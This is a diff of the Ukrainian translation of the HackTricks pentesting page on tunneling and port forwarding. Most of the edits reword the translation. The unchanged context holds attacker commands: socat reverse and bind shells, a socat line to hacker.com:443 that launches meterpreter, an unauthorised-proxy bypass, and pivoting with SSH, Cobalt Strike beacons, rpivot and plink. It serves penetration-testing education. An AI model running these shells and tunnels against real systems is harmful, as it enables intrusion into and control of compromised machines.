@@ -1,15 +1,15 @@
 # Tunneling and Port Forwarding
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -41,7 +41,7 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-SSH графічне з'єднання (X)
+Графічне з'єднання SSH (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
@@ -57,7 +57,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Локальний порт --> Скомпрометований хост (SSH) --> Третій\_бокс:Порт
+Локальний порт --> Скомпрометований хост (SSH) --> Третя\_машина:Порт
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -118,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Локальний порт --> Скомпрометований хост (активна сесія) --> Третя\_коробка:Порт
+Локальний порт --> Скомпрометований хост (активна сесія) --> Третя\_машина:Порт
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -148,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Відкрийте порт на teamserver, який слухає на всіх інтерфейсах, що може бути використаний для **маршрутизації трафіку через beacon**.
+Відкрийте порт на сервері команди, що прослуховує на всіх інтерфейсах, який можна використовувати для **маршрутизації трафіку через маяк**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -167,9 +167,9 @@ rportfwd stop [bind port]
 ```
 To note:
 
-- Beacon's reverse port forward is designed to **тунелювати трафік до Team Server, а не для пересилання між окремими машинами**.
-- Traffic is **тунельований в межах C2 трафіку Beacon**, включаючи P2P посилання.
-- **Привілеї адміністратора не потрібні** для створення зворотних портів на високих портах.
+* Beacon's reverse port forward is designed to **тунелювати трафік до Team Server, а не для пересилання між окремими машинами**.
+* Traffic is **тунельований в межах C2 трафіку Beacon**, включаючи P2P посилання.
+* **Привілеї адміністратора не потрібні** для створення зворотних портів на високих портах.
 
 ### rPort2Port local
 
@@ -247,7 +247,7 @@ listener_list
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Зворотний тунель. Тунель запускається з жертви.\
+Зворотний тунель. Тунель починається з жертви.\
 Створюється socks4 проксі на 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -273,7 +273,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 ```
-### Зворотний шелл
+### Реверс-шелл
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -296,7 +296,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Ви можете обійти **неавторизований проксі**, виконавши цей рядок замість останнього в консолі жертви:
+Ви можете обійти **неавторизований проксі**, виконавши цю команду замість останньої в консолі жертви:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -330,9 +330,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Це як консольна версія PuTTY (опції дуже схожі на ssh-клієнт).
+Це як консольна версія PuTTY (опції дуже схожі на клієнт ssh).
 
-Оскільки цей бінар буде виконуватись на жертві і є ssh-клієнтом, нам потрібно відкрити наш ssh-сервіс і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
+Оскільки цей бінар буде виконуватись на жертві і є клієнтом ssh, нам потрібно відкрити наш сервіс ssh і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -353,7 +353,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Вам потрібно мати **доступ до RDP через систему**.\
+Вам потрібно мати **доступ RDP до системи**.\
 Завантажте:
 
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP-з'єднання**.
@@ -364,7 +364,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Тепер ми можемо **підключитися** до **жертви** через **RDP** за допомогою **`mstsc.exe`**, і ми повинні отримати **підказку**, що **плагін SocksOverRDP увімкнено**, і він буде **слухати** на **127.0.0.1:1080**.
+Тепер ми можемо **підключитися** до **жертви** через **RDP**, використовуючи **`mstsc.exe`**, і ми повинні отримати **підказку**, що **плагін SocksOverRDP увімкнено**, і він буде **слухати** на **127.0.0.1:1080**.
 
 **Підключіться** через **RDP** та завантажте і виконайте на машині жертви бінарний файл `SocksOverRDP-Server.exe`:
 ```
@@ -378,14 +378,14 @@ netstat -antb | findstr 1080
 
 ## Проксування Windows GUI додатків
 
-Ви можете налаштувати Windows GUI додатки на навігацію через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
+Ви можете налаштувати Windows GUI додатки для роботи через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
 У **Профіль -> Проксі-сервери** додайте IP-адресу та порт SOCKS сервера.\
 У **Профіль -> Правила проксування** додайте назву програми для проксування та з'єднання з IP-адресами, які ви хочете проксувати.
 
 ## Обхід NTLM проксі
 
 Раніше згадуваний інструмент: **Rpivot**\
-**OpenVPN** також може обійти це, встановивши ці параметри в конфігураційному файлі:
+**OpenVPN** також може обійти це, встановивши ці параметри у файлі конфігурації:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -393,7 +393,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Він аутентифікується проти проксі і прив'язує порт локально, який перенаправляється на зовнішній сервіс, який ви вказуєте. Потім ви можете використовувати інструмент на ваш вибір через цей порт.\
+Він аутентифікується проти проксі-сервера та прив'язує порт локально, який перенаправляється на зовнішній сервіс, який ви вказуєте. Потім ви можете використовувати інструмент на ваш вибір через цей порт.\
 Наприклад, перенаправити порт 443
 ```
 Username Alice
@@ -402,7 +402,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Тепер, якщо ви налаштуєте, наприклад, на жертві службу **SSH** для прослуховування на порту 443. Ви можете підключитися до неї через порт атакуючого 2222.\
+Тепер, якщо ви налаштуєте, наприклад, на жертві сервіс **SSH** для прослуховування на порту 443. Ви можете підключитися до нього через порт атакуючого 2222.\
 Ви також можете використовувати **meterpreter**, який підключається до localhost:443, а атакуючий прослуховує на порту 2222.
 
 ## YARP
@@ -489,13 +489,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) - це інструмент для експонування рішень в Інтернеті в один рядок команди.**
-*URI експонування виглядають так:* **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **є інструментом для експонування рішень в Інтернеті в один рядок команди.**\
+&#xNAN;_&#x45;xposition URI виглядають так:_ **UID.ngrok.io**
 
 ### Встановлення
 
-- Створіть обліковий запис: https://ngrok.com/signup
-- Завантаження клієнта:
+* Створіть обліковий запис: https://ngrok.com/signup
+* Завантаження клієнта:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -506,7 +506,7 @@ chmod a+x ./ngrok
 
 **Документація:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*Також можливо додати аутентифікацію та TLS, якщо це необхідно.*
+_Також можливо додати аутентифікацію та TLS, якщо це необхідно._
 
 #### Тунелювання TCP
 ```bash
@@ -523,7 +523,7 @@ chmod a+x ./ngrok
 ```
 #### Перехоплення HTTP викликів
 
-*Корисно для XSS, SSRF, SSTI ...*
+_Корисно для XSS, SSRF, SSTI ..._\
 Безпосередньо з stdout або в HTTP інтерфейсі [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Тунелювання внутрішнього HTTP сервісу
@@ -536,8 +536,9 @@ chmod a+x ./ngrok
 #### ngrok.yaml простий приклад конфігурації
 
 Він відкриває 3 тунелі:
-- 2 TCP
-- 1 HTTP з експозицією статичних файлів з /tmp/httpbin/
+
+* 2 TCP
+* 1 HTTP з експозицією статичних файлів з /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -556,15 +557,15 @@ addr: file:///tmp/httpbin/
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 {% hint style="success" %}
-Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вивчайте та практикуйте AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Підтримайте HackTricks</summary>
 
 * Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
